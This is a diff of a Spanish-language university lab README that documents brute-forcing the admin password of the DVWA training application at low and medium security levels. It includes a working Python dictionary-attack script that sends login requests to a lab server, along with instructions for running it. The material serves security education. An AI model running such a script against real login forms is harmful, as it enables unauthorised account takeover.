@@ -1,102 +1,120 @@
 # Práctica 01: Brute Force (Fuerza Bruta)
 
-## 📝 Descripción
-En esta práctica se explota una vulnerabilidad de autenticación en **DVWA**. El objetivo es descubrir la contraseña del usuario `admin` mediante un ataque de diccionario, probando múltiples combinaciones hasta encontrar la correcta.
+**Autor:** Ruben Ferrer (brean-rb / 10813818)
+**Asignatura:** Puesta en Producción Segura
 
-## ⚠️ Justificación Metodológica
-Inicialmente se planteó el uso de la herramienta **Hydra**. Sin embargo, durante la ejecución en el entorno de laboratorio, se detectaron **errores persistentes de sintaxis y compatibilidad** relacionados con la gestión de cookies de sesión y el formato de los parámetros HTTP en la versión instalada.
+## Descripción de la Vulnerabilidad
 
-Para garantizar la reproducibilidad y el éxito del ataque, se decidió **adaptar el script de Python** (originalmente diseñado para el nivel de dificultad *High*) para resolver también los niveles **Low** y **Medium**. Esta aproximación programática nos permite:
-1.  Tener control total sobre las cabeceras HTTP y la cookie `PHPSESSID`.
-2.  Evitar los falsos positivos/negativos que estaba generando la herramienta automática.
-3.  Gestionar los retardos de tiempo del servidor de forma nativa sin errores de conexión.
+El ataque de Fuerza Bruta consiste en un método de prueba y error para adivinar credenciales (usuario y contraseña) mediante la automatización. En esta práctica, el objetivo es vulnerar el formulario de autenticación de **DVWA** para obtener la contraseña del usuario `admin` probando múltiples combinaciones desde un diccionario predefinido.
+
+## Justificación Técnica: Selección de Herramientas
+
+> **Nota sobre la Metodología**
+>
+> Inicialmente se planteó el uso de la herramienta estándar **Hydra**. Sin embargo, durante la ejecución en el entorno de laboratorio, se detectaron errores persistentes de sintaxis y compatibilidad relacionados con la gestión de cookies de sesión (PHPSESSID) y el manejo de los parámetros HTTP en la versión desplegada de DVWA.
+>
+> Para garantizar la reproducibilidad y el éxito del ataque, se optó por desarrollar **scripts personalizados en Python**. Esta aproximación programática permite:
+> 1. Control total sobre las cabeceras HTTP y la inyección de cookies.
+> 2. Gestión nativa de los tiempos de espera (timeouts) del servidor, crucial para el nivel Medio.
+> 3. Eliminación de falsos positivos derivados de errores de conexión de herramientas automatizadas.
+
+## Estructura de Archivos
+
+* `brute_low.py`: Script de ataque desarrollado para el nivel de seguridad bajo.
+* `brute_medium.py`: Script de ataque adaptado para gestionar retardos en el nivel medio.
+* `diccionario.txt`: Archivo de texto plano conteniendo la lista de contraseñas candidatas.
+* `README.md`: Documentación técnica de la práctica.
 
 ---
 
-## 📂 Archivos de la Práctica
-La estructura de archivos utilizada para esta práctica es la siguiente:
+## Nivel: LOW
 
-* `brute_low.py`: Script de ataque configurado para el nivel de seguridad bajo.
-* `brute_medium.py`: Script de ataque configurado para el nivel de seguridad medio.
-* `diccionario.txt`: Archivo de texto con las contraseñas a probar.
-* `../asset/`: Carpeta donde se almacenan las evidencias gráficas.
+### Análisis
+En el nivel de seguridad bajo, la aplicación no implementa ninguna medida de protección contra ataques de fuerza bruta. No existen mecanismos de bloqueo de cuenta, retardos artificiales (sleep) ni desafíos CAPTCHA. El servidor responde inmediatamente a cada intento de inicio de sesión.
 
----
+### Implementación del Ataque (`brute_low.py`)
+El script itera sobre el archivo `diccionario.txt`, enviando peticiones GET al servidor. Se verifica la respuesta buscando la cadena de éxito "Welcome".
 
-## 🟢 Nivel: LOW
-
-En este nivel, la aplicación no implementa ninguna medida de seguridad contra la fuerza bruta (ni CAPTCHA, ni bloqueo, ni retardos).
-
-### Script (`brute_low.py`)
-El siguiente código muestra la lógica utilizada. *Nota: Los datos sensibles como IP o Cookies han sido sustituidos por marcadores genéricos para esta documentación, aunque en la ejecución real se usaron los datos activos de la sesión.*
+**Configuración del Script:**
+Se requiere extraer el `PHPSESSID` del navegador (F12 > Storage > Cookies) para mantener la sesión autenticada durante el ataque.
 
 ```python
 import requests
 
-# --- CONFIGURACIÓN DEL ENTORNO ---
-target_ip = "<IP_DEL_SERVIDOR>"
-# Cookie de sesión activa (Extraída con F12 -> Storage)
-session_id = "<PEGAR_AQUI_PHPSESSID>" 
-
-# Nivel de seguridad objetivo
-security_level = "low" 
-# ---------------------------------
+# Configuración del Objetivo
+target_ip = "192.168.0.39"
+session_id = "<INSERTAR_PHPSESSID_AQUI>"
+security_level = "low"
 
 url = f"http://{target_ip}:9090/vulnerabilities/brute/"
 cookies = {'PHPSESSID': session_id, 'security': security_level}
 
-print(f"[*] Iniciando ataque en nivel: {security_level.upper()}...")
-
-# Carga del diccionario
-try:
-    with open("diccionario.txt", "r") as f:
-        passwords = f.read().splitlines()
-except FileNotFoundError:
-    print("Error: No se encuentra diccionario.txt")
-    exit()
+# Lógica del Ataque
+with open("diccionario.txt", "r") as f:
+    passwords = f.read().splitlines()
 
 for password in passwords:
-    # Parámetros requeridos por el formulario de DVWA
     params = {'username': 'admin', 'password': password, 'Login': 'Login'}
-    
     try:
         r = requests.get(url, params=params, cookies=cookies)
-        
-        # Si la respuesta contiene "Welcome", hemos entrado
         if "Welcome" in r.text:
-            print(f"\n[!!!] ÉXITO: Contraseña encontrada -> {password}")
+            print(f"[SUCCESS] Contraseña encontrada: {password}")
             break
-        else:
-            print(f"[-] Fallo con: {password}")
-            
     except Exception as e:
         print(f"Error de conexión: {e}")
+
+```
+
+### Reproducción
+
+1. Editar `brute_low.py` e insertar el `PHPSESSID` actual.
+2. Ejecutar el script:
+```bash
+python3 brute_low.py
+
 ```
 
 ### Evidencia
+
+Captura de pantalla demostrando la obtención de la contraseña en texto claro.
 ![Brute Force Low](../asset/01_brute_force_low.png)
 
 ---
 
-## 🟠 Nivel: MEDIUM
+## Nivel: MEDIUM
 
-En el nivel medio, la aplicación introduce una medida de seguridad pasiva: un **retardo (sleep) de 2 segundos** cada vez que se introduce una contraseña incorrecta. Esto ralentiza el ataque considerablemente, pero no lo detiene.
+### Análisis
 
-Nuestro script en Python maneja este comportamiento automáticamente, esperando la respuesta del servidor antes de lanzar el siguiente intento, lo que lo hace más efectivo que Hydra en este contexto.
+En el nivel medio, la aplicación introduce una medida de seguridad pasiva: un **retardo artificial (sleep)** de 2 segundos tras cada intento fallido de autenticación.
 
-### Script (`brute_medium.py`)
-La configuración cambia únicamente en la cookie de seguridad para indicar al servidor el nuevo nivel:
+* **Impacto:** Ralentiza significativamente el ataque, haciendo inviable el uso de fuerza bruta masiva en corto tiempo.
+* **Vulnerabilidad:** Aunque lento, el ataque sigue siendo posible ya que no hay bloqueo definitivo de la cuenta.
+
+### Adaptación del Script (`brute_medium.py`)
+
+El script en Python maneja este comportamiento de forma síncrona, esperando la respuesta del servidor antes de lanzar el siguiente intento. Esto evita errores de "Connection Refused" o timeouts que herramientas como Hydra podrían interpretar como fallos de servicio.
+
+La única modificación técnica respecto al nivel anterior es el cambio en la cookie de seguridad:
 
 ```python
-# ... (El resto del código es idéntico al anterior)
-
 # Configuración para nivel medio
 security_level = "medium" 
+# El resto de la lógica de requests.get maneja la espera del servidor automáticamente.
 
-# ...
 ```
 
-### Evidencia
-Como se observa en la ejecución, el ataque es exitoso a pesar del retardo introducido por el servidor.
+### Reproducción
 
+1. Asegurarse de que el nivel de seguridad en DVWA (o en la cookie) está en `medium`.
+2. Ejecutar el script:
+```bash
+python3 brute_medium.py
+
+```
+
+
+
+### Evidencia
+
+El script logra identificar la contraseña a pesar del retardo introducido por el servidor.
 ![Brute Force Medium](../asset/01_brute_force_medium.png)
